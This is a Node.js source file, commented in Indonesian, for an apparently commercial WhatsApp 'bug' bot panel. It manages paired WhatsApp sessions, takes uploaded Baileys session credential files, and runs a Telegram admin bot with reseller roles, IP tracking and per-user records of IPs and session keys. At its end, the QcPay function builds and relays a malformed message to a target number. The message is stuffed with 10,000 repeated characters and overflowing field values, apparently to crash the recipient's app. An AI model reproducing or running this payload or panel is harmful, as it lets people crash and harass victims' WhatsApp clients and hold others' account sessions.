async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('vanzzmd', owner, number); 

  if (!fs.existsSync('vanzzmd')) fs.mkdirSync('vanzzmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });


  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('vanzzmd', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}


async function startUserSessions() {
  // Ambil semua subfolder dalam vanzzmd
  const subfolders = fs.readdirSync('vanzzmd')
    .map(name => path.join('vanzzmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside vanzzmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      // ✅ Cek apakah session sudah aktif
      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName); // gunakan await kalau connectSession async
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('vanzzmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}



// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'vanzzmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

// ══════════════════════════════════════════════════════════════
// TELEGRAM — /status Command
// ══════════════════════════════════════════════════════════════
bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== OWNER_ID) return bot.sendMessage(chatId, "❌ Tidak diizinkan");

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://arzzpanel.arzzhostingxcloud.my.id:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *AXRRG-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// ══════════════════════════════════════════════════════════════
// TELEGRAM — Email Access Management
// ══════════════════════════════════════════════════════════════
bot.onText(/^\/?approveemail (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== OWNER_ID) return bot.sendMessage(chatId, "❌ Tidak diizinkan");

  const targetUser = match[1].trim();
  const db = loadDatabase();
  const target = db.find(u => u.username === targetUser);
  if (!target) return bot.sendMessage(chatId, `❌ User '${targetUser}' tidak ditemukan`);

  setEmailAccess(targetUser, 'approved', 'telegram_bot');
  console.log(`[🔐 TG APPROVE] ${targetUser}`);

  if (wsClients[targetUser]) {
    wsClients[targetUser].send(JSON.stringify({
      type: 'email:access:update',
      status: 'approved',
      message: '✅ Akses email lo udah di-approve!'
    }));
  }

  bot.sendMessage(chatId, `✅ User ${targetUser} di-approve akses email`);
});

bot.onText(/^\/?rejectemail (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== OWNER_ID) return bot.sendMessage(chatId, "❌ Tidak diizinkan");

  const targetUser = match[1].trim();
  setEmailAccess(targetUser, 'rejected', 'telegram_bot');
  bot.sendMessage(chatId, `❌ User ${targetUser} di-reject`);
});

bot.onText(/^\/?banemail (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== OWNER_ID) return bot.sendMessage(chatId, "❌ Tidak diizinkan");

  const targetUser = match[1].trim();
  setEmailAccess(targetUser, 'banned', 'telegram_bot');
  bot.sendMessage(chatId, `🚫 User ${targetUser} di-ban dari email`);
});

bot.onText(/^\/?pendingemail$/, async (msg) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== OWNER_ID) return bot.sendMessage(chatId, "❌ Tidak diizinkan");

  const access = loadEmailAccess();
  const pending = Object.entries(access).filter(([_, v]) => v.status === 'pending');

  if (!pending.length) return bot.sendMessage(chatId, "✅ Gak ada yang pending");

  let text = `⏳ *Pending Requests (${pending.length}):*\n\n`;
  pending.forEach(([u, v], i) => {
    text += `${i+1}. \`${u}\` — ${new Date(v.requestedAt).toLocaleString('id-ID')}\n`;
  });
  text += `\nApprove: \`/approveemail username\``;

  bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

bot.onText(/^\/?emaillist$/, async (msg) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== OWNER_ID) return bot.sendMessage(chatId, "❌ Tidak diizinkan");

  const access = loadEmailAccess();
  const entries = Object.entries(access);

  if (!entries.length) return bot.sendMessage(chatId, "📭 Belum ada user yang akses");

  const approved = entries.filter(([_, v]) => v.status === 'approved').length;
  const pending = entries.filter(([_, v]) => v.status === 'pending').length;
  const banned = entries.filter(([_, v]) => v.status === 'banned').length;

  let text = `📊 *Email Access Report*\n\n`;
  text += `✅ Approved: ${approved}\n`;
  text += `⏳ Pending: ${pending}\n`;
  text += `🚫 Banned: ${banned}\n\n`;
  text += `Pakai /pendingemail buat lihat pending requests.`;

  bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

console.log('[📱 TELEGRAM] Email access commands registered');

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* ${session}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "vanzzmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder vanzzmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *vanzzmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'vanzzmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// Express sudah dijalankan lewat server.listen di atas

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);

async function QcPay(sock, target, zid = true) {
  const payload = "꧀".repeat(10000)
  const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      body: {
        text: payload
      },
      nativeFlowMessage: {
        messageVersion: 3,
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `detail`
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `ssss`
            })
          }

        ]
      },
      contextInfo: {
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        participant: "0@s.whatsapp.net",
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: payload,
          contentType: 3,
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: 999e+21 * 999e+21
          }
        },
        remoteJid: "@s.whatsapp.net"
      }
    }
  }), {});

  await sock.relayMessage(target, miaw.message, zid ? { messageId: miaw.key.id, participant: { jid: target } } : { messageId: miaw.key.id });
  await sleep(10000);
}

